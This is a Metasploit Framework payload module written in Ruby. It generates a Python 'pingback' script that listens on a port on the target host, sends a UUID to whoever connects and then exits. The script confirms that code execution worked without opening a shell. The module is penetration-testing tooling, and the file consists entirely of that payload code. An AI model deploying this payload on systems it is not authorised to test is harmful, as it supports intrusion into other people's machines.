require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/python'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = 381

  include Msf::Payload::Single
  include Msf::Sessions::PingbackOptions
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Python Pingback, Bind TCP (via python)',
      'Description' => 'Listens for a connection from the attacker, sends a UUID, then terminates',
      'Author' => 'asoto-r7',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::BindTcp,
      'Session' => Msf::Sessions::Pingback,
      'PayloadType' => 'python',
      'Payload' =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  def generate
    super + command_string
  end

  def command_string
    pingback_uuid ||= generate_pingback_uuid
    pingback_uuid.gsub!('-','')

    cmd  = "import socket as s\n"
    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
    cmd << "try:\n"
    cmd << " so.bind(('0.0.0.0',#{ datastore['LPORT']}))\n"
    cmd << " so.listen(1)\n"
    cmd << " so,addr=so.accept()\n"
    cmd << " so.send('#{pingback_uuid}')\n"
    cmd << " so.close()\n"
    cmd << "except:\n"
    cmd << " pass\n"

   cmd
 end

  def include_send_pingback
    true
  end
end


